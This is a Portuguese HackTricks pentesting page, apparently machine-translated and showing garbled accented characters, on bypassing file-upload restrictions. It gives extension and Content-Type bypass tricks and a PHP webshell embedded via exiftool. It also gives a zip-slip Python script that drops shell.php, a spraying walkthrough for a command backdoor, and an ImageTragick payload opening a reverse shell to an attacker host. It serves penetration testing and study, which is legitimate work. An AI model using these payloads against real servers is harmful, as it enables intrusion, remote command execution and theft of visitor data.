# Metodologia geral de upload de arquivos

1. Tente fazer o upload de um arquivo com **dupla extens√£o** \(ex: _file.png.php_ ou _file.png.php5_\).
   * Extens√µes PHP: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
   * Extens√µes ASP: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. Tente **colocar letras em mai√∫sculo** na extens√£o. Como: _.pHp, .pHP5, .PhAr ..._
3. Tente fazer o upload de **dupla \(ou mais\) extens√£o** \(√∫til para burlar verifica√ß√µes mal configuradas que testam se uma extens√£o espec√≠fica est√° presente\):
   1. _file.png.php_
   2. _file.png.txt.php_
4. Tente fazer o upload de **dupla extens√£o reversa** \(√∫til para explorar m√°s configura√ß√µes do Apache onde qualquer coisa com extens√£o _.php_, mas **n√£o necessariamente terminando em .php** executar√° o c√≥digo\):
   * _ex: file.php.png_
5. Dupla extens√£o com **caractere nulo:**
   1. _ex: file.php%00.png_
6. **Adicione alguns caracteres especiais no final** da extens√£o_: %00, %20, \(v√°rios pontos\)...._
   1. _file.php%00_
   2. _file.php%20_
   3. _file.php...... --&gt; No Windows, quando um arquivo √© criado com pontos no final, eles ser√£o removidos \(para que voc√™ possa burlar filtros que verificam a extens√£o .php\)_
   4. _file.php/_
   5. _file.php.\_
7. Bypass em verifica√ß√µes de Content-Type definindo o **valor** do **header Content-Type** para: _image/png_ , _text/plain , application/octet-stream_
8. Bypass em verifica√ß√£o de magic number adicionando no in√≠cio do arquivo os **bytes de uma imagem real** \(confundir o comando _file_\). Ou introduza o shell dentro dos **metadados**: `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
   1. Tamb√©m √© poss√≠vel que os **bytes m√°gicos** estejam sendo **verificados** no arquivo e voc√™ possa defini-los **em qualquer lugar do arquivo**.
9. Usando **NTFS alternate data stream \(ADS\)** no **Windows**. Nesse caso, um caractere de dois pontos ":" ser√° inserido ap√≥s uma extens√£o proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extens√£o proibida** ser√° criado no servidor \(por exemplo, "file.asax:.jpg"\). Este arquivo pode ser editado posteriormente usando outras t√©cnicas, como usar seu nome curto. O padr√£o "**::$data**" tamb√©m pode ser usado para criar arquivos n√£o vazios. Portanto, adicionar um caractere de ponto ap√≥s esse padr√£o tamb√©m pode ser √∫til para burlar outras restri√ß√µes \(.e.g. "file.asp::$data."\)
10. **Fa√ßa o upload** da backdoor com uma **extens√£o permitida** \(_png_\) e reze por uma **m√° configura√ß√£o** que execute a backdoor
11. Encontre uma vulnerabilidade para **renomear** o arquivo j√° carregado \(para alterar a extens√£o\).
12. Encontre uma vulnerabilidade de **inclus√£o de arquivo local** para executar a backdoor.
13. **Poss√≠vel divulga√ß√£o de informa√ß√µes**:
    1. Fa√ßa o upload **v√°rias vezes** \(e ao mesmo tempo\) do **mesmo arquivo** com o **mesmo nome**
    2. Fa√ßa o upload de um arquivo com o **nome** de um **arquivo** ou **pasta** que **j√° existe**
    3. Fazer upload de um arquivo com **‚Äú.‚Äù, ‚Äú..‚Äù, ou ‚Äú‚Ä¶‚Äù como seu nome**. Por exemplo, no Apache no **Windows**, se o aplicativo salvar os arquivos carregados no diret√≥rio ‚Äú/www/uploads/‚Äù, o nome de arquivo ‚Äú.‚Äù criar√° um arquivo chamado ‚Äúuploads‚Äù no diret√≥rio ‚Äú/www/‚Äù.
    4. Fa√ßa o upload de um arquivo que n√£o possa ser exclu√≠do facilmente, como **‚Äú‚Ä¶:.jpg‚Äù** no **NTFS**. \(Windows\)
    5. Fa√ßa o upload de um arquivo no **Windows** com **caracteres inv√°lidos** como `|<>*?‚Äù` em seu nome. \(Windows\)
    6. Fa√ßa o upload de um arquivo no **Windows** usando **nomes reservados** \(**proibidos**\) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 e LPT9.

Tente tamb√©m **fazer o upload de um execut√°vel** \(.exe\) ou um **.html** \(menos suspeito\) que **executar√° c√≥digo** quando aberto acidentalmente pela v√≠tima.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files" %}

Se voc√™ estiver tentando fazer upload de arquivos para um **servidor PHP**, [d√™ uma olhada no truque do **.htaccess** para executar c√≥digo](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).  
Se voc√™ estiver tentando fazer upload de arquivos para um **servidor ASP**, [d√™ uma olhada no truque do **.config** para executar c√≥digo](../pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` s√£o como os arquivos `.jar` para Java, mas para PHP, e podem ser **usados como um arquivo PHP** \(executando-o com PHP ou incluindo-o dentro de um script...\)

A extens√£o `.inc` √© √†s vezes usada para arquivos PHP que s√£o usados apenas para **importar arquivos**, ent√£o, em algum momento, algu√©m pode ter permitido **a execu√ß√£o dessa extens√£o**.

**Verifique muitas poss√≠veis vulnerabilidades de upload de arquivos com o plugin BurpSuit** [**https://github.com/modzero/mod0BurpUploadScanner**](https://github.com/modzero/mod0BurpUploadScanner) **ou use um aplicativo de console que encontra quais arquivos podem ser carregados e tente diferentes truques para executar c√≥digo:** [**https://github.com/almandin/fuxploider**](https://github.com/almandin/fuxploider)

## **Truque de upload de arquivo/SSRF do wget**

Em algumas ocasi√µes, voc√™ pode descobrir que um servidor est√° usando **`wget`** para **baixar arquivos** e voc√™ pode **indicar** a **URL**. Nesses casos, o c√≥digo pode estar verificando se a extens√£o dos arquivos baixados est√° dentro de uma lista branca para garantir que apenas arquivos permitidos sejam baixados. No entanto, **essa verifica√ß√£o pode ser burlada.**  
O **comprimento m√°ximo** de um **nome de arquivo** no **Linux** √© **255**, no entanto, o **wget** trunca os nomes
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Observe que **outra op√ß√£o** que voc√™ pode estar pensando para contornar essa verifica√ß√£o √© fazer com que o **servidor HTTP redirecione para um arquivo diferente**, para que a URL inicial contorne a verifica√ß√£o e, em seguida, o wget fa√ßa o download do arquivo redirecionado com o novo nome. Isso **n√£o funcionar√°** **a menos que** o wget esteja sendo usado com o **par√¢metro** `--trust-server-names`, porque **o wget far√° o download da p√°gina redirecionada com o nome do arquivo indicado na URL original**.

# De upload de arquivo para outras vulnerabilidades

* Defina o **nome do arquivo** como `../../../tmp/lol.png` e tente alcan√ßar uma **travessia de caminho**
* Defina o **nome do arquivo** como `sleep(10)-- -.jpg` e voc√™ pode ser capaz de alcan√ßar uma **inje√ß√£o de SQL**
* Defina o **nome do arquivo** como `<svg onload=alert(document.comain)>` para alcan√ßar um XSS
* Defina o **nome do arquivo** como `; sleep 10;` para testar algumas inje√ß√µes de comando \(mais [truques de inje√ß√£o de comando aqui](command-injection.md)\)
* [**XSS** em upload de arquivo de imagem \(svg\)](xss-cross-site-scripting/#xss-uploading-files-svg)
* **Upload** de arquivo **JS** + **XSS** = explora√ß√£o de [**Service Workers**](xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE em upload de svg**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirecionamento aberto** via upload de arquivo svg](open-redirect.md#open-redirect-uploading-svg-files)
* [Famosa vulnerabilidade de **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Se voc√™ puder **indicar ao servidor web para capturar uma imagem de uma URL**, voc√™ pode tentar abusar de um [SSRF](ssrf-server-side-request-forgery.md). Se esta **imagem** for ser **salva** em algum site **p√∫blico**, voc√™ tamb√©m pode indicar uma URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **roubar informa√ß√µes de todos os visitantes**.

Aqui est√° uma lista dos 10 principais itens que voc√™ pode alcan√ßar fazendo upload \(de [link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)\):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS armazenado / SSRF / XXE
3. **GIF**: XSS armazenado / SSRF
4. **CSV**: inje√ß√£o de CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : inje√ß√£o de HTML / XSS / Redirecionamento aberto
8. **PNG / JPEG**: ataque de inunda√ß√£o de pixels \(DoS\)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

# Upload de arquivo zip descompactado automaticamente

Se voc√™ puder fazer upload de um ZIP que ser√° descompactado dentro do servidor, poder√° fazer 2 coisas:

## Symlink 

Fa√ßa upload de um link contendo links suaves para outros arquivos e, em seguida, acessando os arquivos descompactados, voc√™ acessar√° os arquivos vinculados:
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## Descompactar em pastas diferentes

Os arquivos descompactados ser√£o criados em pastas inesperadas.

Pode-se facilmente assumir que essa configura√ß√£o protege contra a execu√ß√£o de comandos de n√≠vel de sistema operacional por meio de uploads de arquivos maliciosos, mas infelizmente isso n√£o √© verdade. Como o formato de arquivo ZIP suporta compress√£o hier√°rquica e tamb√©m podemos fazer refer√™ncia a diret√≥rios de n√≠vel superior, podemos escapar do diret√≥rio de upload seguro abusando da funcionalidade de descompacta√ß√£o do aplicativo alvo.

Um exploit automatizado para criar esse tipo de arquivos pode ser encontrado aqui: [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Algum c√≥digo em Python para criar um zip malicioso: 

```python
import zipfile

zip_file = zipfile.ZipFile('malicious.zip', mode='w')
zip_file.write('evil_file.php')
zip_file.close()
```

Este c√≥digo cria um arquivo zip malicioso chamado `malicious.zip` que cont√©m um arquivo chamado `evil_file.php`.
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO 
 
def create_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
    z.writestr('otherfile.xml', 'Content of the file')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 
 
create_zip() 
```
Para conseguir a execu√ß√£o remota de comandos, segui os seguintes passos:

1. Criar um shell PHP:
```php
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>
```
2. Use a t√©cnica de "file spraying" e crie um arquivo zip compactado:
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
  adding: xxAcmd.php (deflated 40%)
  adding: xxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. Use um hexeditor ou vi e mude "xxA" para "../", eu usei vi:
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
Apenas um passo restou: fazer o upload do arquivo ZIP e permitir que a aplica√ß√£o o descompacte! Se tiver sucesso e o servidor web tiver privil√©gios suficientes para escrever nos diret√≥rios, haver√° um shell de execu√ß√£o de comando simples no sistema:

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**Refer√™ncia**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

# ImageTragic

Fa√ßa o upload deste conte√∫do com uma extens√£o de imagem para explorar a vulnerabilidade **\(ImageMagick, 7.0.1-1\)**.
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# Incorporando um Shell PHP em PGN

A principal raz√£o para colocar um shell da web no chunk IDAT √© que ele tem a capacidade de ignorar opera√ß√µes de redimensionamento e reamostragem - o PHP-GD cont√©m duas fun√ß√µes para isso [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) e [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

Leia este post: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# Arquivos Poliglotas

Poliglotas, em um contexto de seguran√ßa, s√£o arquivos que s√£o uma forma v√°lida de v√°rios tipos de arquivos diferentes. Por exemplo, um [GIFAR](https://en.wikipedia.org/wiki/Gifar) √© tanto um arquivo GIF quanto um arquivo RAR. Existem tamb√©m arquivos que podem ser tanto GIF quanto JS, tanto PPT quanto JS, etc.

Arquivos poliglotas s√£o frequentemente usados para contornar a prote√ß√£o baseada em tipos de arquivo. Muitos aplicativos que permitem que os usu√°rios fa√ßam upload de arquivos permitem apenas uploads de certos tipos, como JPEG, GIF, DOC, para evitar que os usu√°rios fa√ßam upload de arquivos potencialmente perigosos como arquivos JS, arquivos PHP ou arquivos Phar.

Isso ajuda a fazer upload de um arquivo que est√° em conformidade com o formato de v√°rios formatos diferentes. Isso pode permitir que voc√™ fa√ßa upload de um arquivo PHAR (PHp ARchive) que tamb√©m parece um JPEG, mas provavelmente voc√™ ainda precisar√° de uma extens√£o v√°lida e, se a fun√ß√£o de upload n√£o permitir, isso n√£o ajudar√°.

Mais informa√ß√µes em: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
